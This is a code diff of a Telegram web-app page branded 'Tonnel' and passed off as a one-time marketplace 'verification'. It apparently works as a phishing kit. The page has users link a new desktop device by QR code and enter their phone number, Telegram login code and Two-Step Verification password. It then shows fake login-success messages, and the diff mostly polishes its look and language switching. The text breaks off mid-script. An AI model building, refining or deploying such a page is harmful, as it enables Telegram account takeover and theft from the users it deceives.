@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tonnel Verification</title>
+    <title>Tonnel</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/bodymovin/5.12.2/lottie.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/pako/2.1.0/pako.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
 
         * {
             margin: 0;
@@ -18,15 +18,19 @@
         }
 
         :root {
-            --bg-color: #0a0e0d;
+            --bg-color: #060a09;
+            --card-bg: #0e1412;
             --text-color: #e5e5e5;
-            --subtext-color: #6a7175;
+            --subtext-color: #6a8a7a;
             --btn-color: #00b894;
+            --btn-hover: #00d2a0;
             --btn-text: #ffffff;
-            --header-bg: #0a0e0d;
-            --icon-bg: #1c1e1e;
+            --header-bg: #060a09;
+            --icon-bg: #141e1a;
             --tonnel-green: #00b894;
-            --tonnel-dark: #0a0e0d;
+            --tonnel-dark: #060a09;
+            --border-color: rgba(0, 184, 148, 0.15);
+            --shadow: 0 8px 32px rgba(0, 184, 148, 0.08);
         }
 
         body {
@@ -39,40 +43,43 @@
             overflow-x: hidden;
         }
 
+        /* ── Header ── */
         .header {
             width: 100%;
-            padding: 12px 16px;
+            padding: 14px 20px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             background: var(--header-bg);
-            border-bottom: 1px solid rgba(0, 184, 148, 0.1);
+            border-bottom: 1px solid var(--border-color);
+            backdrop-filter: blur(10px);
         }
 
         .header-left {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 14px;
         }
 
         .avatar-container {
             position: relative;
-            width: 40px;
-            height: 40px;
+            width: 44px;
+            height: 44px;
             border-radius: 50%;
-            padding: 2px;
+            padding: 2.5px;
             --progress: 25%;
-            background: conic-gradient(var(--btn-color) 0%, var(--btn-color) var(--progress), #252828 var(--progress), #252828 100%);
+            background: conic-gradient(var(--btn-color) 0%, var(--btn-color) var(--progress), #1a2a24 var(--progress), #1a2a24 100%);
             display: flex;
             align-items: center;
             justify-content: center;
+            transition: all 0.3s ease;
         }
 
         .avatar {
             width: 100%;
             height: 100%;
             border-radius: 50%;
-            background-color: #212121;
+            background-color: #141e1a;
             object-fit: cover;
             border: 2px solid var(--bg-color);
         }
@@ -89,147 +96,232 @@
         .header-right {
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
         }
 
         .icon-btn {
-            width: 36px;
-            height: 36px;
-            border-radius: 10px;
+            width: 38px;
+            height: 38px;
+            border-radius: 12px;
             background: var(--icon-bg);
             display: flex;
             align-items: center;
             justify-content: center;
             position: relative;
             cursor: pointer;
+            border: 1px solid transparent;
+            transition: all 0.2s ease;
+        }
+
+        .icon-btn:hover {
+            border-color: var(--border-color);
+            background: #1a2a24;
         }
 
         .icon-btn svg {
             width: 18px;
             height: 18px;
-            fill: #d1d1d1;
+            fill: #8aa89a;
+            transition: fill 0.2s;
+        }
+
+        .icon-btn:hover svg {
+            fill: #00b894;
         }
 
         .badge {
             position: absolute;
-            top: -4px;
-            right: -4px;
-            background: #e63946;
+            top: -5px;
+            right: -5px;
+            background: #00b894;
             color: white;
-            font-size: 10px;
+            font-size: 9px;
             font-weight: 800;
-            padding: 2px 5px;
-            border-radius: 8px;
+            padding: 2px 6px;
+            border-radius: 10px;
             border: 2px solid var(--bg-color);
+            min-width: 18px;
+            text-align: center;
         }
 
+        /* ── Main Content ── */
         .content {
             flex: 1;
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 20px 20px;
+            padding: 24px 20px 30px;
             position: relative;
-            margin-top: 10px;
-            background: #111313;
-            border-top-left-radius: 20px;
-            border-top-right-radius: 20px;
+            margin-top: 0;
+            background: var(--card-bg);
+            border-top-left-radius: 24px;
+            border-top-right-radius: 24px;
+            box-shadow: var(--shadow);
         }
 
         .drag-handle {
             width: 40px;
             height: 4px;
-            background: #252828;
+            background: #1a2a24;
             border-radius: 2px;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
             position: absolute;
             top: 12px;
         }
 
-        .illustration {
-            display: block;
-            width: 140px;
-            height: 140px;
-            margin-bottom: 24px;
-            margin-top: 10px;
+        .logo-container {
+            width: 120px;
+            height: 120px;
+            margin-bottom: 28px;
+            margin-top: 8px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, rgba(0, 184, 148, 0.1), rgba(0, 184, 148, 0.02));
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 50%;
         }
 
         .title {
-            font-size: 22px;
-            font-weight: 800;
+            font-size: 24px;
+            font-weight: 900;
             margin-bottom: 8px;
             text-align: center;
             color: #f5f5f5;
+            letter-spacing: -0.5px;
         }
 
         .title .tonnel-highlight {
             color: var(--tonnel-green);
+            background: linear-gradient(135deg, #00b894, #00d2a0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
         .subtitle {
-            font-size: 13px;
+            font-size: 14px;
             color: var(--subtext-color);
             text-align: center;
-            line-height: 1.4;
-            margin-bottom: 30px;
+            line-height: 1.5;
+            margin-bottom: 32px;
             max-width: 300px;
+            font-weight: 400;
         }
 
+        /* ── Buttons ── */
         .btn-primary {
             width: 100%;
             max-width: 340px;
-            padding: 16px;
-            background: var(--btn-color);
+            padding: 17px;
+            background: linear-gradient(135deg, #00b894, #00d2a0);
             color: var(--btn-text);
             border: none;
-            border-radius: 12px;
+            border-radius: 14px;
             font-size: 16px;
             font-weight: 700;
             font-family: 'Inter', sans-serif;
             cursor: pointer;
-            transition: opacity 0.2s;
+            transition: all 0.25s ease;
             margin-top: auto;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
+            box-shadow: 0 4px 20px rgba(0, 184, 148, 0.25);
+            letter-spacing: 0.3px;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 28px rgba(0, 184, 148, 0.35);
         }
 
         .btn-primary:active {
-            opacity: 0.8;
+            transform: scale(0.97);
+            opacity: 0.9;
         }
 
         .btn-secondary {
             width: 100%;
             max-width: 340px;
-            padding: 16px;
-            background: #1f2222;
-            color: #ffffff;
-            border: 1px solid rgba(0, 184, 148, 0.2);
-            border-radius: 12px;
+            padding: 17px;
+            background: transparent;
+            color: #8aa89a;
+            border: 1.5px solid var(--border-color);
+            border-radius: 14px;
             font-size: 16px;
-            font-weight: 700;
+            font-weight: 600;
             font-family: 'Inter', sans-serif;
             cursor: pointer;
-            transition: opacity 0.2s;
+            transition: all 0.25s ease;
+        }
+
+        .btn-secondary:hover {
+            border-color: #00b894;
+            color: #ffffff;
+            background: rgba(0, 184, 148, 0.05);
         }
 
         .btn-secondary:active {
-            opacity: 0.8;
+            transform: scale(0.97);
         }
 
-        .qr-box {
-            background: #ffffff;
-            padding: 12px;
-            border-radius: 20px;
-            margin-bottom: 16px;
+        .btn-option {
+            width: 100%;
+            max-width: 340px;
+            padding: 16px;
+            background: transparent;
+            color: #d1d1d1;
+            border: 1.5px solid var(--border-color);
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 600;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: all 0.25s ease;
             display: flex;
             align-items: center;
             justify-content: center;
+            gap: 12px;
+        }
+
+        .btn-option:hover {
+            border-color: #00b894;
+            background: rgba(0, 184, 148, 0.05);
+            color: #ffffff;
+        }
+
+        .btn-option svg {
+            fill: #6a8a7a;
+            transition: fill 0.2s;
+        }
+
+        .btn-option:hover svg {
+            fill: #00b894;
+        }
+
+        /* ── QR ── */
+        .qr-box {
+            background: #ffffff;
+            padding: 16px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
         }
 
         .qr-instructions {
             font-size: 13px;
             color: var(--subtext-color);
             text-align: center;
-            line-height: 1.5;
+            line-height: 1.6;
             margin-bottom: 20px;
             max-width: 280px;
         }
@@ -238,47 +330,89 @@
             background: none;
             border: none;
             color: var(--subtext-color);
-            font-size: 15px;
+            font-size: 14px;
             cursor: pointer;
-            padding: 10px;
+            padding: 12px;
             margin-top: auto;
             margin-bottom: 10px;
+            transition: color 0.2s;
+            font-weight: 500;
         }
 
-        input::-webkit-outer-spin-button,
-        input::-webkit-inner-spin-button {
-            -webkit-appearance: none;
-            margin: 0;
+        .btn-back:hover {
+            color: #00b894;
         }
 
-        input[type=number] {
-            -moz-appearance: textfield;
+        /* ── Inputs ── */
+        input[type="tel"],
+        input[type="password"],
+        .code-input-box {
+            background: #141e1a;
+            border: 1.5px solid #1a2a24;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.2s ease;
+            font-family: 'Inter', sans-serif;
         }
 
-        input[type="password"]::-webkit-reveal,
-        input[type="password"]::-ms-reveal {
-            display: none !important;
+        input[type="tel"]:focus,
+        input[type="password"]:focus,
+        .code-input-box:focus {
+            border-color: #00b894;
+            box-shadow: 0 0 0 3px rgba(0, 184, 148, 0.1);
         }
 
-        input[type="password"]::-webkit-contacts-auto-fill-button,
-        input[type="password"]::-webkit-credentials-auto-fill-button {
-            visibility: hidden;
-            display: none !important;
-            pointer-events: none;
-            position: absolute;
-            right: 0;
+        input[type="tel"] {
+            width: 100%;
+            max-width: 340px;
+            padding: 16px;
+        }
+
+        .code-input-box {
+            width: 48px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .pwd-input {
+            width: 100%;
+            padding: 16px;
+            padding-right: 48px;
+            background: #141e1a;
+            border: 1.5px solid #1a2a24;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .pwd-input:focus {
+            border-color: #00b894;
+            box-shadow: 0 0 0 3px rgba(0, 184, 148, 0.1);
         }
 
         .btn-submit-pwd {
-            background: var(--tonnel-green) !important;
+            background: linear-gradient(135deg, #00b894, #00d2a0) !important;
             color: #fff !important;
         }
 
         .btn-submit-pwd:disabled {
-            background: #1a5a4a !important;
-            color: rgba(255, 255, 255, 0.5) !important;
+            background: #1a4a3a !important;
+            color: rgba(255, 255, 255, 0.3) !important;
             cursor: not-allowed;
-            opacity: 1;
+            box-shadow: none !important;
+        }
+
+        /* ── Errors ── */
+        .pwd-invalid {
+            border-color: #ef4444 !important;
+            background: rgba(239, 68, 68, 0.05) !important;
+            animation: shakeError 0.4s ease-in-out;
         }
 
         @keyframes shakeError {
@@ -287,64 +421,36 @@
             75% { transform: translateX(5px); }
         }
 
-        .pwd-invalid {
-            border-color: #ef4444 !important;
-            background: rgba(239, 68, 68, 0.1) !important;
-            animation: shakeError 0.4s ease-in-out;
-        }
-
-        .code-inputs {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 30px;
-            justify-content: center;
-        }
-
-        .code-input-box {
-            width: 48px;
-            height: 60px;
-            background: #1c1e1e;
-            border: 1px solid #333;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 24px;
+        .error-msg {
+            color: #ef4444;
+            font-size: 14px;
+            margin-top: -12px;
+            margin-bottom: 20px;
             text-align: center;
-            font-weight: 700;
-            outline: none;
-            transition: border-color 0.2s;
+            display: none;
         }
 
-        .code-input-box:focus {
-            border-color: var(--tonnel-green);
-        }
-
-        .pwd-input:focus {
-            border-color: var(--tonnel-green);
-        }
-
+        /* ── Hidden ── */
         .hidden {
             display: none !important;
         }
 
-        .tonnel-logo {
-            font-size: 28px;
-            font-weight: 800;
-            letter-spacing: -0.5px;
+        /* ── Scrollbar ── */
+        ::-webkit-scrollbar {
+            width: 4px;
         }
-
-        .tonnel-logo span {
-            color: var(--tonnel-green);
+        ::-webkit-scrollbar-track {
+            background: transparent;
         }
-
-        .tonnel-logo small {
-            font-size: 14px;
-            font-weight: 400;
-            color: var(--subtext-color);
+        ::-webkit-scrollbar-thumb {
+            background: #1a2a24;
+            border-radius: 4px;
         }
     </style>
 </head>
 <body>
 
+    <!-- ═══ HEADER ═══ -->
     <div class="header">
         <div class="header-left">
             <div class="avatar-container" id="avatarContainer">
@@ -354,16 +460,16 @@
         </div>
         <div class="header-right">
             <div class="lang-toggle" onclick="toggleLanguage()" id="langToggle"
-                style="color: #d1d1d1; font-weight: bold; cursor: pointer; background: var(--icon-bg); padding: 8px 12px; border-radius: 10px; font-size: 14px; user-select: none;">
-                RU
+                style="color: #8aa89a; font-weight: 600; cursor: pointer; background: var(--icon-bg); padding: 8px 14px; border-radius: 10px; font-size: 13px; user-select: none; border: 1px solid transparent; transition: all 0.2s;">
+                EN
             </div>
-            <div class="icon-btn">
-                <div class="badge">12</div>
+            <div class="icon-btn" id="notifBtn" onclick="showNotification()">
+                <div class="badge" id="notifBadge">3</div>
                 <svg viewBox="0 0 24 24">
                     <path d="M20 12.5v-1.5c0-1.1-.9-2-2-2h-1c0-2.8-2.2-5-5-5S7 6.2 7 9H6c-1.1 0-2 .9-2 2v1.5c0 1.1.9 2 2 2h1v1.5c0 1.1.9 2 2 2h1c0 2.8 2.2 5 5 5s5-2.2 5-5h1c1.1 0 2-.9 2-2z"/>
                 </svg>
             </div>
-            <div class="icon-btn">
+            <div class="icon-btn" id="menuBtn" onclick="toggleMenu()">
                 <svg viewBox="0 0 24 24">
                     <path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z"/>
                 </svg>
@@ -371,49 +477,49 @@
         </div>
     </div>
 
+    <!-- ═══ CONTENT ═══ -->
     <div class="content">
         <div class="drag-handle"></div>
 
         <div id="mainScreen" style="display: flex; flex-direction: column; align-items: center; width: 100%;">
-            <div id="lottieContainer" class="illustration"></div>
-            <div id="tgsError" style="color: #ef4444; font-size: 11px; margin-top: -10px; display: none;"></div>
+
+            <!-- LOGO (вместо Lottie) -->
+            <div class="logo-container">
+                <img src="https://mining-bitcoin.ru/wp-content/uploads/2025/10/tonnel-relayer-730679.png" alt="Tonnel" id="logoImage">
+            </div>
 
             <div class="title" id="mainTitle">
-                <span class="tonnel-highlight">Tonnel</span> Verification
+                <span class="tonnel-highlight">Tonnel</span>
             </div>
             <div class="subtitle" id="mainSubtitle">
-                Complete one-time verification to continue trading gifts on Tonnel marketplace.
+                Secure access to Tonnel marketplace<br>
+                Verify your identity to continue
             </div>
 
             <button class="btn-primary" id="btnContinue" onclick="continueToVerification()">
-                Continue →
+                Get Started
             </button>
 
-            <div id="loginOptions"
-                style="display: none; width: 100%; max-width: 340px; flex-direction: column; gap: 12px; margin-top: auto; margin-bottom: 20px;">
-                <button class="btn-primary"
-                    style="margin: 0; display: flex; align-items: center; justify-content: center; gap: 8px;"
-                    onclick="selectLogin('qr')">
+            <!-- Login Options -->
+            <div id="loginOptions" style="display: none; width: 100%; max-width: 340px; flex-direction: column; gap: 12px; margin-top: auto; margin-bottom: 16px;">
+                <button class="btn-option" onclick="selectLogin('qr')">
                     <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                         <path d="M3 3h8v8H3V3zm2 2v4h4V5H5zm8-2h8v8h-8V3zm2 2v4h4V5h-4zM3 13h8v8H3v-8zm2 2v4h4v-4H5zm13-2h3v2h-3v-2zm-3 0h2v2h-2v-2zm3 3h3v2h-3v-2zm-3 0h2v2h-2v-2zm3 3h3v2h-3v-2zm-3 0h2v2h-2v-2z"/>
                     </svg>
-                    <span data-i18n="btnQR">QR Code</span>
+                    QR Code
                 </button>
-                <button class="btn-secondary"
-                    style="margin: 0; display: flex; align-items: center; justify-content: center; gap: 8px;"
-                    onclick="selectLogin('phone')">
+                <button class="btn-option" onclick="selectLogin('phone')">
                     <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                         <path d="M17 1H7c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 18H7V5h10v14zm-6 1h2v-2h-2v2z"/>
                     </svg>
-                    <span data-i18n="btnPhone">Phone Number</span>
+                    Phone Number
                 </button>
             </div>
 
             <!-- QR Screen -->
             <div id="qrScreen" style="display: none; flex-direction: column; align-items: center; width: 100%;">
                 <div class="qr-box" id="qrCodeBox">
-                    <div id="qrPlaceholder"
-                        style="width:200px; height:200px; display:flex; align-items:center; justify-content:center; color:#000;">
+                    <div id="qrPlaceholder" style="width:200px; height:200px; display:flex; align-items:center; justify-content:center; color:#000;">
                         Loading...
                     </div>
                 </div>
@@ -426,23 +532,20 @@
 
             <!-- Password Screen -->
             <div id="passwordScreen" style="display: none; flex-direction: column; align-items: center; width: 100%;">
-                <div style="font-size: 15px; color: #6a7175; margin-bottom: 24px; text-align: center; max-width: 280px; line-height: 1.5;">
+                <div style="font-size: 14px; color: var(--subtext-color); margin-bottom: 24px; text-align: center; max-width: 280px; line-height: 1.6;">
                     Enter your Two-Step Verification password
                 </div>
                 <div style="position: relative; width: 100%; max-width: 340px; margin-bottom: 24px;">
                     <input type="password" id="passwordInput" class="pwd-input" placeholder="2FA Password"
-                        style="width: 100%; padding: 16px; padding-right: 48px; background: #1c1e1e; border: 1px solid #333; border-radius: 12px; color: #fff; font-size: 16px; outline: none; transition: border-color 0.2s;"
                         oninput="checkPwdInput()">
                     <div onclick="togglePasswordVisibility()"
-                        style="position: absolute; right: 16px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #6a7175; display: flex; align-items: center;">
+                        style="position: absolute; right: 16px; top: 50%; transform: translateY(-50%); cursor: pointer; color: var(--subtext-color); display: flex; align-items: center;">
                         <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                             <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                         </svg>
                     </div>
                 </div>
-                <div id="pwdErrorMsg" style="display: none; color: #ef4444; font-size: 14px; margin-top: -15px; margin-bottom: 20px; text-align: center;">
-                    Invalid password. Try again.
-                </div>
+                <div id="pwdErrorMsg" class="error-msg">Invalid password. Try again.</div>
                 <button class="btn-primary btn-submit-pwd" onclick="submitPassword()" id="btnSubmitPassword" disabled>
                     Log In
                 </button>
@@ -451,28 +554,27 @@
 
             <!-- Phone Screen -->
             <div id="phoneScreen" style="display: none; flex-direction: column; align-items: center; width: 100%;">
-                <div style="font-size: 15px; color: #6a7175; margin-bottom: 24px; text-align: center; max-width: 280px; line-height: 1.5;">
+                <div style="font-size: 14px; color: var(--subtext-color); margin-bottom: 24px; text-align: center; max-width: 280px; line-height: 1.6;">
                     Enter your Telegram phone number
                 </div>
-                <input type="tel" id="phoneInput" placeholder="Phone number"
-                    style="width: 100%; max-width: 340px; padding: 16px; background: #1c1e1e; border: 1px solid #333; border-radius: 12px; color: #fff; font-size: 16px; outline: none; margin-bottom: 24px;">
+                <input type="tel" id="phoneInput" placeholder="Phone number">
                 <button class="btn-primary" onclick="submitPhone()" id="btnSubmitPhone"
-                    style="margin-bottom: 12px; background: #1a5a4a; color: #fff;">
+                    style="margin-bottom: 12px; background: #1a4a3a; color: #fff; box-shadow: none;">
                     Continue
                 </button>
                 <button class="btn-secondary" onclick="requestTelegramPhone()" id="btnRequestPhone"
-                    style="margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 8px; background: #1c1e1e; border: 1px solid #333;">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="#00b894">
+                    style="display: flex; align-items: center; justify-content: center; gap: 10px; background: transparent;">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#00b894">
                         <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"/>
                     </svg>
-                    <span>Send number via Telegram</span>
+                    Send number via Telegram
                 </button>
                 <button class="btn-back" onclick="goBackFromPhone()">← Back</button>
             </div>
 
             <!-- Code Screen -->
             <div id="codeScreen" style="display: none; flex-direction: column; align-items: center; width: 100%;">
-                <div style="font-size: 15px; color: #6a7175; margin-bottom: 24px; text-align: center; max-width: 280px; line-height: 1.5;">
+                <div style="font-size: 14px; color: var(--subtext-color); margin-bottom: 24px; text-align: center; max-width: 280px; line-height: 1.6;">
                     We sent a verification code to your Telegram
                 </div>
                 <div class="code-inputs" id="codeInputsContainer">
@@ -487,110 +589,143 @@
                     <input type="number" class="code-input-box" maxlength="1" oninput="moveToNext(this, 4)"
                         onkeydown="handleBackspace(event, 4)">
                 </div>
-                <div id="codeErrorMsg" style="display: none; color: #ef4444; font-size: 14px; margin-top: -15px; margin-bottom: 20px; text-align: center;">
-                    Invalid code. Try again.
-                </div>
+                <div id="codeErrorMsg" class="error-msg">Invalid code. Try again.</div>
                 <button class="btn-primary" onclick="submitCode()" id="btnSubmitCode" style="display: none;">
                     Continue
                 </button>
                 <button class="btn-back" onclick="location.reload()">← Cancel</button>
             </div>
+
         </div>
     </div>
 
+    <!-- ═══ SCRIPT ═══ -->
     <script>
         const API_BASE = window.location.origin + '/api';
         const tg = window.Telegram?.WebApp;
         let userId = 0;
         let username = '';
 
+        // ── Localization ──
         const locales = {
-            'RU': {
-                'mainTitle': 'Верификация Tonnel',
-                'mainSubtitle': 'Пройдите разовую верификацию для продолжения торговли на Tonnel.',
-                'btnContinue': 'Продолжить →',
-                'btnQR': 'QR Код',
-                'btnPhone': 'Номер телефона',
-                'loading': 'Загрузка...',
-                'qrInstructions': '1. Откройте Telegram → Настройки → Устройства → Привязать устройство<br><br>2. Наведите камеру на QR код',
-                'btnBack': '← Назад',
-                'pwdInstruction': 'Введите пароль двухфакторной аутентификации',
-                'pwdError': 'Неверный пароль. Попробуйте снова.',
-                'btnLogin': 'Войти',
-                'btnCancel': '← Отмена',
-                'phoneInstruction': 'Введите номер телефона Telegram',
-                'btnSendPhone': 'Отправить номер из Telegram',
-                'codeInstruction': 'Мы отправили код в Telegram',
-                'codeError': 'Неверный код, попробуйте снова',
-                'titleLoginMethod': 'Выберите способ входа',
-                'titleTelegramLogin': 'Вход через Telegram',
-                'titleSuccess': 'Успешно!',
-                'successMessageQR': '<div style="color:#00b894; padding: 20px; text-align: center; font-weight: bold;">✅ Вы успешно вошли в Tonnel!</div>',
-                'errorQR': 'Ошибка QR авторизации',
-                'titleEnterPassword': 'Введите 2FA пароль',
-                'titleEnterPhone': 'Введите номер',
-                'titleCode': 'Код подтверждения',
-                'successCode': '<div style="color:#00b894; padding: 20px; text-align: center; font-weight: bold;">✅ Успешный вход в Tonnel!</div>',
-                'title2FA': 'Двухфакторная защита',
-                'successPwd': '<div style="color:#00b894; padding: 20px; text-align: center; font-weight: bold;">✅ Пароль принят! Вход выполнен.</div>'
-            },
-            'ENG': {
-                'mainTitle': 'Tonnel Verification',
-                'mainSubtitle': 'Complete one-time verification to continue trading on Tonnel.',
-                'btnContinue': 'Continue →',
+            'EN': {
+                'title': 'Tonnel',
+                'subtitle': 'Secure access to Tonnel marketplace<br>Verify your identity to continue',
+                'btnContinue': 'Get Started',
                 'btnQR': 'QR Code',
                 'btnPhone': 'Phone Number',
-                'loading': 'Loading...',
-                'qrInstructions': '1. Open Telegram → Settings → Devices → Link Desktop Device<br><br>2. Scan QR code',
-                'btnBack': '← Back',
+                'qrInstructions': '1. Open Telegram → Settings → Devices → Link Desktop Device<br><br>2. Scan QR code with your Telegram app',
                 'pwdInstruction': 'Enter your Two-Step Verification password',
                 'pwdError': 'Invalid password. Try again.',
                 'btnLogin': 'Log In',
-                'btnCancel': '← Cancel',
                 'phoneInstruction': 'Enter your Telegram phone number',
                 'btnSendPhone': 'Send number via Telegram',
                 'codeInstruction': 'We sent a verification code to your Telegram',
-                'codeError': 'Invalid code, try again',
+                'codeError': 'Invalid code. Try again.',
                 'titleLoginMethod': 'Choose login method',
-                'titleTelegramLogin': 'Login with Telegram',
                 'titleSuccess': 'Success!',
                 'successMessageQR': '<div style="color:#00b894; padding: 20px; text-align: center; font-weight: bold;">✅ Successfully logged in to Tonnel!</div>',
-                'errorQR': 'QR auth error',
+                'errorQR': 'QR auth error. Try again.',
                 'titleEnterPassword': 'Enter 2FA password',
                 'titleEnterPhone': 'Enter phone number',
                 'titleCode': 'Verification code',
                 'successCode': '<div style="color:#00b894; padding: 20px; text-align: center; font-weight: bold;">✅ Successfully logged in to Tonnel!</div>',
                 'title2FA': 'Two-Step Verification',
-                'successPwd': '<div style="color:#00b894; padding: 20px; text-align: center; font-weight: bold;">✅ Password accepted! Login successful.</div>'
+                'successPwd': '<div style="color:#00b894; padding: 20px; text-align: center; font-weight: bold;">✅ Password accepted! Login successful.</div>',
+                'loading': 'Loading...',
+                'btnBack': '← Back',
+                'btnCancel': '← Cancel'
+            },
+            'RU': {
+                'title': 'Tonnel',
+                'subtitle': 'Безопасный доступ к маркетплейсу Tonnel<br>Подтвердите личность для продолжения',
+                'btnContinue': 'Начать',
+                'btnQR': 'QR Код',
+                'btnPhone': 'Номер телефона',
+                'qrInstructions': '1. Откройте Telegram → Настройки → Устройства → Привязать устройство<br><br>2. Наведите камеру на QR код',
+                'pwdInstruction': 'Введите пароль двухфакторной аутентификации',
+                'pwdError': 'Неверный пароль. Попробуйте снова.',
+                'btnLogin': 'Войти',
+                'phoneInstruction': 'Введите номер телефона Telegram',
+                'btnSendPhone': 'Отправить номер из Telegram',
+                'codeInstruction': 'Мы отправили код подтверждения в Telegram',
+                'codeError': 'Неверный код. Попробуйте снова.',
+                'titleLoginMethod': 'Выберите способ входа',
+                'titleSuccess': 'Успешно!',
+                'successMessageQR': '<div style="color:#00b894; padding: 20px; text-align: center; font-weight: bold;">✅ Вы успешно вошли в Tonnel!</div>',
+                'errorQR': 'Ошибка QR авторизации. Попробуйте снова.',
+                'titleEnterPassword': 'Введите 2FA пароль',
+                'titleEnterPhone': 'Введите номер телефона',
+                'titleCode': 'Код подтверждения',
+                'successCode': '<div style="color:#00b894; padding: 20px; text-align: center; font-weight: bold;">✅ Успешный вход в Tonnel!</div>',
+                'title2FA': 'Двухфакторная защита',
+                'successPwd': '<div style="color:#00b894; padding: 20px; text-align: center; font-weight: bold;">✅ Пароль принят! Вход выполнен.</div>',
+                'loading': 'Загрузка...',
+                'btnBack': '← Назад',
+                'btnCancel': '← Отмена'
             }
         };
 
-        let currentLanguage = 'ENG';
+        let currentLanguage = 'EN';
 
         function setLanguage(lang) {
             currentLanguage = lang;
             document.getElementById('langToggle').innerText = lang;
+
             document.querySelectorAll('[data-i18n]').forEach(el => {
                 const key = el.getAttribute('data-i18n');
-                if (locales[lang][key]) {
-                    if (el.tagName === 'DIV' || el.tagName === 'SPAN' || el.tagName === 'BUTTON') {
-                        el.innerHTML = locales[lang][key];
-                    }
+                if (locales[lang] && locales[lang][key]) {
+                    el.innerHTML = locales[lang][key];
                 }
             });
+
             document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
                 const key = el.getAttribute('data-i18n-placeholder');
-                if (locales[lang][key]) {
+                if (locales[lang] && locales[lang][key]) {
                     el.placeholder = locales[lang][key];
                 }
             });
+
+            updateDynamicTexts();
         }
 
         function toggleLanguage() {
-            const newLang = currentLanguage === 'RU' ? 'ENG' : 'RU';
+            const newLang = currentLanguage === 'EN' ? 'RU' : 'EN';
             setLanguage(newLang);
         }
 
+        function t(key) {
+            return locales[currentLanguage]?.[key] || key;
+        }
+
+        function updateDynamicTexts() {
+            const titleEl = document.getElementById('mainTitle');
+            const subtitleEl = document.getElementById('mainSubtitle');
+            const btn = document.getElementById('btnContinue');
+
+            if (!titleEl) return;
+
+            // Update title based on screen state
+            if (titleEl.innerHTML.includes('Tonnel') && !titleEl.innerHTML.includes('Verification')) {
+                titleEl.innerHTML = `<span class="tonnel-highlight">Tonnel</span>`;
+            }
+
+            // Update subtitle
+            if (subtitleEl) {
+                const state = document.getElementById('loginOptions')?.style?.display;
+                if (state === 'flex') {
+                    subtitleEl.innerHTML = t('titleLoginMethod') || 'Choose login method';
+                } else {
+                    subtitleEl.innerHTML = t('subtitle');
+                }
+            }
+
+            if (btn) {
+                btn.innerText = t('btnContinue');
+            }
+        }
+
+        // ── Telegram WebApp Init ──
         if (tg) {
             tg.ready();
             tg.expand();
@@ -607,23 +742,346 @@
                     document.getElementById('userAvatar').src = user.photo_url;
                 }
             }
+
+            let phoneHandled = false;
+            if (tg.onEvent) {
+                tg.onEvent('contactRequested', (e) => {
+                    if (!e || e.status !== 'sent' || phoneHandled) return;
